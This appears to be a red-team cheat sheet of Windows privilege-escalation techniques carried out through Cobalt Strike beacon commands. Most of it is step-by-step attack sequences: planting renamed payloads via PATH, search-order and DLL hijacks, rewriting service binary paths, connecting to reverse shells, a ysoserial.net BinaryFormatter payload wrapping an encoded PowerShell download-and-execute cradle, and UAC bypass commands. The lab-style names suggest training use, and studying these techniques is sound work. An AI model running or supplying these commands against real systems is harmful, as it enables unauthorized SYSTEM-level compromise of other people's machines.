### 🔹 **1. PATH Environment Variable Hijack**

**What it is:**  
If a folder listed before System32 in the PATH is writable, you can place a malicious binary with the same name as a legitimate one (e.g., timeout.exe).

**Usage:** When you can write to a directory listed in the PATH before C:\Windows\System32.

**Key commands:**

```powershell
beacon>powershell Get-Item Env:Path # View environment variables, look for paths before System32; if not fully visible:
beacon> env (buscamos Path=)
beacon> cacls <dir>    # Check directory permissions, see if you can write.
beacon> cd <dir_writable>           
beacon> upload <payload>            
beacon> mv <payload> <nombre_legítimo>.exe
```

**Practical example:**

```powershell
beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```



🔹 **2. Search Order Hijacking**

**What it is:**  
Hijacking the search order when executing binaries (varies depending on the API used: CreateProcess, ShellExecuteEx, WinExec).

**Typical search order (WinExec):**

1. Executable directory
    
2. Current directory
    
3. `C:\Windows\System32`
    
4. `C:\Windows`
    
5. PATH

**Key points**
- If the executable is in a writable directory, you can impersonate cmd.exe, etc.

**Usage:** When you can write to the directory where the service/application binary resides.

**Commands:**
```powershell
beacon> cacls "C:\Ruta\Del\Binario"
beacon> cd "C:\Ruta\Del\Binario"
beacon> upload <payload>
beacon> mv <payload> cmd.exe
```

**Example:**
```powershell
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```


### 🔹 **3. Unquoted Service Path Hijacking**

**What it is:**  
Services configured with paths containing spaces that are not quoted. Windows performs ambiguous searches (C:\Program Files\Bad.exe, etc.).

**Find unquoted paths:**

```powershell
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon> cd C:\Program Files\Vulnerable Services
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> run sc stop VulnService1
beacon> run sc start VulnService1
beacon> connect localhost 4444
```


### 🔹 **4. Service Permissions**

#### 💥 Requirements
- Permission to modify the service configuration (sc config).
- The binary does not need to be vulnerable, only the configuration.
- 
```powershell
# 1. Enumerate modifiable services
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. 2. View exact permissions
beacon> powershell-import Get-ServiceAcl.ps1
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

# 3. View current configuration
beacon> run sc qc VulnService2

# 4. Upload payload
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload tcp-local_x64.svc.exe

# 5. Change binary path
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

# 6. Restart service
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

# 7. Connect to reverse shell
beacon> connect localhost 4444
```

### 🔹 **5. Weak Service Binary Permission**

#### 💥 Requirements
- Write permissions on the service binary.**.
```powershell
# 1. Enumerate modifiable services
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. View permissions on the binary
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

# 3. Copy payload with the binary name
PS> copy "tcp-local_x64.svc.exe" "Service 3.exe"

# 4. Stop service
beacon> run sc stop VulnService3

# 5. Upload the modified binary
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload Service 3.exe

# 6. Start service
beacon> run sc start VulnService3

# 7. Connect to a reverse shell
beacon> connect localhost 4444
```


### 🔹 **DLL Search Order Hijacking**
### What is it?

When an application needs a DLL, it often specifies only the name without a full path. Windows then searches for that DLL in a specific order called the “DLL search order”.

👉If you can write a malicious file to a directory checked before the legitimate one, you can trick the app into loading your malicious DLL with elevated privileges.
---

### 📚 **Typical DLL search order in Windows:**:

1. 📁 Directory from which the program is executed
    
2. 📁 `C:\Windows\System32`
    
3. 📁 `C:\Windows\System`
    
4. 📁 `C:\Windows`
    
5. 📁 **Current working directory**
    
6. 📁 Directories in the PATH environment variable

```powershell
# 1. Check if the executable loads a DLL without a full path (common in poorly written apps)
→ Confirmed it looks for "BadDll.dll" without path

#2. View the directory where the service runs
beacon> ls "C:\Program Files\Bad Windows Service\Service Executable"

# 3. Check if that directory is writable
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
# If you see: Authenticated Users:(CI)(OI)F → YOU HAVE WRITE PERMISSIONS 🟢

# 4. Upload a malicious DLL
beacon> cd "C:\Program Files\Bad Windows Service\Service Executable"
beacon> upload C:\Payloads\dns_x64.dll

# 5. Rename the DLL the app is looking for
beacon> mv dns_x64.dll BadDll.dll

# 6. Wait for the service to run, or restart it if possible
beacon> run sc stop BadWindowsService
beacon> run sc start BadWindowsService

# 7. You now have a shell with the service's privileges 😈
beacon> connect localhost 4444 (or whatever you configured)
```



### 🔹 **7.Privilege Escalation via Deserialization Vulnerability**

Many programs save objects to binary files. To reuse them, they deserialize those files. The issue arises when the program:

- Deserializes data from a path you can control (e.g., C:\Temp\data.bin)
- Uses a vulnerable technique like `BinaryFormatter.`
- **Runs with elevated privileges (e.g., SYSTEM, admin)

👉In that case, you can write a malicious file that, when deserialized, executes your code as SYSTEM. 🔥

```powershell
#SEARCH FOR BINARIES THAT DESERIALIZE
Get-ChildItem -Path C:\ -Recurse -Include *.bin,*.dat,*.txt -ErrorAction SilentlyContinue -Force |
Where-Object { 
    -not $_.PSIsContainer -and 
    (Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -SimpleMatch "deserialise") 
} |
Select-Object FullName
```

- If you can write to the binary's path and the program runs with elevated permissions… It's your chance!
- 
```powershell
C:\Tools\ysoserial.net\ysoserial.exe ^
  -g TypeConfuseDelegate ^
  -f BinaryFormatter ^
  -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" ^
  -o raw ^
  --outputpath C:\Payloads\data.bin


beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin
```



### 🔹 **8.  UAC Bypass**

### 🔍 Check your integrity level:

```powershell
beacon>whoami /groups
```
→ You will see a line like: Mandatory Label\Medium Mandatory Level

- Escalate
```powershell
beacon> elevate [exploit] [listener]
#Example:
beacon> elevate uac-token-duplication http_listener
```
### `runasadmin` – Run commands with elevation

```powershell
runasadmin uac-schtasks cmd.exe /c whoami /groups
```
